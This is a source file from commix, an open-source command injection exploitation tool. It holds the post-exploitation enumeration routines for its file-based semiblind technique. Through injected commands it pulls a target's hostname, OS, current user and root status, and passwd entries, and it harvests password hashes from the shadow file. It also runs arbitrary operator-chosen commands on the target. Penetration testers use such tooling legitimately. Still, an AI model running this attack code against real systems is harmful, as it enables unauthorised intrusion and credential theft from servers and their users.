#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind_based.techniques.file_based import fb_injector

"""
 The "file-based" technique on Semiblind-based OS Command Injection.
"""

"""
Hostname enumeration
"""

def hostname(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  cmd = settings.HOSTNAME
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  if shell:
    if menu.options.verbose:
      print ""
    shell = "".join(str(p) for p in shell)
    if not menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
    sys.stdout.flush()
    # Add infos to logs file. 
    output_file = open(filename, "a")
    output_file.write("    (!) The hostname is " + shell + ".\n")
    output_file.close()
      
"""
Retrieve system information
"""
def system_information(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):  
  cmd = settings.RECOGNISE_OS     
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  target_os = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  if target_os:
    if menu.options.verbose:
      print ""
    target_os = "".join(str(p) for p in target_os)
    if target_os == "Linux":
      cmd = settings.RECOGNISE_HP
      response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
      target_arch = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
      if target_arch:
        if menu.options.verbose:
          print "" 
        target_arch = "".join(str(p) for p in target_arch)
        sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
        sys.stdout.flush()
       # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("    (!) The target operating system is " + target_os)
        output_file.write(" and the hardware platform is " + target_arch + ".\n")
        output_file.close()
    else:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
      sys.stdout.flush()
      # Add infos to logs file.    
      output_file = open(filename, "a")
      output_file.write("    (!) The target operating system is " + target_os + ".\n")
      output_file.close()

"""
The current user enumeration
"""
def current_user(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  cmd = settings.CURRENT_USER
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  cu_account = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  if cu_account:
    cu_account = "".join(str(p) for p in cu_account)
    # Check if the user have super privileges.
    if menu.options.is_root:
      cmd = settings.ISROOT
      response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
      shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
      if shell:
        shell = "".join(str(p) for p in shell)
        if menu.options.verbose:
          print ""
        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
        # Add infos to logs file.    
        output_file = open(filename, "a")
        output_file.write("    (!) The current user is " + cu_account)
        output_file.close()
        if shell != "0":
            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
            sys.stdout.flush()
            # Add infos to logs file.   
            output_file = open(filename, "a")
            output_file.write(" and it is not privilleged.\n")
            output_file.close()
        else:
          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write(" and it is privilleged.\n")
          output_file.close()
    else:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) The current user is " + cu_account + "\n")
      output_file.close()
        
"""
System users enumeration
"""
def system_users(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename): 
  cmd = settings.SYS_USERS             
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  sys_users = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  if sys_users :
    sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
    sys.stdout.flush()
    sys_users = "".join(str(p) for p in sys_users).strip()
    if len(sys_users.split(" ")) <= 1 :
      sys_users = sys_users.split("\n")
    else:
      sys_users = sys_users.split(" ")
    sys_users_list = []
    for user in range(0, len(sys_users), 3):
       sys_users_list.append(sys_users[user : user + 3])
    if len(sys_users_list) != 0 :
      sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) Identified " + str(len(sys_users_list)) + " entries in '" + settings.PASSWD_FILE + "'.\n")
      output_file.close()
      count = 0
      for user in range(0, len(sys_users_list)):
        sys_users = sys_users_list[user]
        sys_users = ":".join(str(p) for p in sys_users)
        if menu.options.verbose:
          print ""
        count = count + 1
        fields = sys_users.split(":")
        # System users privileges enumeration
        if menu.options.privileges:
          if int(fields[1]) == 0:
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
            is_privilleged_nh = " is root user "
          elif int(fields[1]) > 0 and int(fields[1]) < 99 :
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
            is_privilleged_nh = " is system user "
          elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
            if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
              is_privilleged_nh = " is anonymous user "
            elif int(fields[1]) == 60002:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
              is_privilleged_nh = " is non-trusted user "   
            else:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
              is_privilleged_nh = " is regular user "
          else :
            is_privilleged = ""
            is_privilleged_nh = ""
        else :
          is_privilleged = ""
          is_privilleged_nh = ""
        print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privilleged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
        output_file.close()
    else:
      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
      sys.stdout.flush()
      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL

        
"""
System passwords enumeration
"""
def system_passwords(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):  
  cmd = settings.SYS_PASSES    
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  sys_passes = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  if sys_passes :
    sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
    sys.stdout.flush()
    sys_passes = "".join(str(p) for p in sys_passes)
    sys_passes = sys_passes.replace(" ", "\n")
    sys_passes = sys_passes.split( )
    if len(sys_passes) != 0 :
      sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" )
      output_file.close()
      count = 0
      for line in sys_passes:
        count = count + 1
        fields = line.split(":")
        if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
          print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
         # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write("      ("+str(count)+") " + fields[0] + " : " + fields[1])
          output_file.close()  
    else:
      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
      sys.stdout.flush()
      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
        
"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  cmd =  menu.options.os_cmd
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  if shell:
    if menu.options.verbose:
      print ""
    shell = " ".join(str(p) for p in shell)
    if shell != "":
      print Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
    else:
      print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL
  sys.exit(0)

"""
Check the defined options
"""
def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  
  if menu.options.hostname:
    hostname(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True
  elif settings.ENUMERATION_DONE == False:
      print ""
  else:
      print ""
    
  if menu.options.current_user:
    current_user(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    system_information(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

  if menu.options.users:
    system_users(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    system_passwords(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

  if settings.ENUMERATION_DONE :
    print ""
    
# eof